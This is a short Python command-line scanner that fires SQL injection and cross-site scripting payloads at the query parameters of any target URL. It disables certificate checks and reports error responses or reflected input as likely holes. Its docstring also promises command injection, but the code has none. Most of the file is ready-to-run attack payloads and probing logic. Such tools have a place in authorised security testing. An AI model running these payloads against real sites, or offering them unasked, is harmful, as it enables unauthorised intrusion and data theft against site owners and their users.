#!/usr/bin/env python3
"""注入探针 — SQLi + XSS + Command Injection 快速一键测"""
import json, sys, urllib.request, urllib.error, ssl, argparse

ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = False
UA = "Mozilla/5.0 Inject-Probe/1.0"

def probe(url, param, payload, method="GET"):
    full = f"{url}?{param}={urllib.parse.quote(payload)}" if method == "GET" else url
    body = urllib.parse.urlencode({param: payload}).encode() if method == "POST" else None
    r = urllib.request.Request(full, data=body, headers={"User-Agent": UA}, method=method)
    try:
        resp = urllib.request.urlopen(r, timeout=8, context=ctx)
        return resp.status, resp.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")
    except Exception as e:
        return None, str(e)

SQLI_PAYLOADS = [
    ("' OR '1'='1", "Union/Boolean"),
    ("' OR 1=1--", "Comment bypass"),
    ("admin'--", "Auth bypass"),
    ("' UNION SELECT NULL--", "Union probe"),
    ("' AND SLEEP(2)--", "Time-based (wait for response)"),
]

XSS_PAYLOADS = [
    ("<script>alert(1)</script>", "Script tag"),
    ('"><img src=x onerror=alert(1)>', "Img onerror"),
    ("<svg/onload=alert(1)>", "SVG onload"),
    ("'-alert(1)-'", "JS string escape"),
]

def scan(url, params):
    findings = []
    for p in params:
        # SQLi
        for payload, label in SQLI_PAYLOADS:
            code, body = probe(url, p, payload)
            if body and ("error" in body.lower() or "sql" in body.lower() or "syntax" in body.lower()):
                findings.append({"type":"SQLi","param":p,"payload":payload[:40],"label":label,"indicator":"error response"})
                break
        # XSS
        for payload, label in XSS_PAYLOADS:
            code, body = probe(url, p, payload)
            if body and payload in body:
                findings.append({"type":"XSS","param":p,"payload":payload[:40],"label":label,"indicator":"reflected"})
                break
    return findings

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("url", help="Target URL with params: http://x.com/search?q=test")
    p.add_argument("--params", help="Comma-separated param names (auto-detected from URL if omitted)")
    p.add_argument("--method", default="GET")
    args = p.parse_args()

    from urllib.parse import urlparse, parse_qs
    parsed = urlparse(args.url)
    params = args.params.split(",") if args.params else list(parse_qs(parsed.query).keys())
    if not params:
        print("No params found. Use --params q,search,id")
        sys.exit(1)

    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    findings = scan(base, params)
    print(json.dumps({"target": base, "params": params, "findings": findings, "total": len(findings)}, ensure_ascii=False, indent=2))
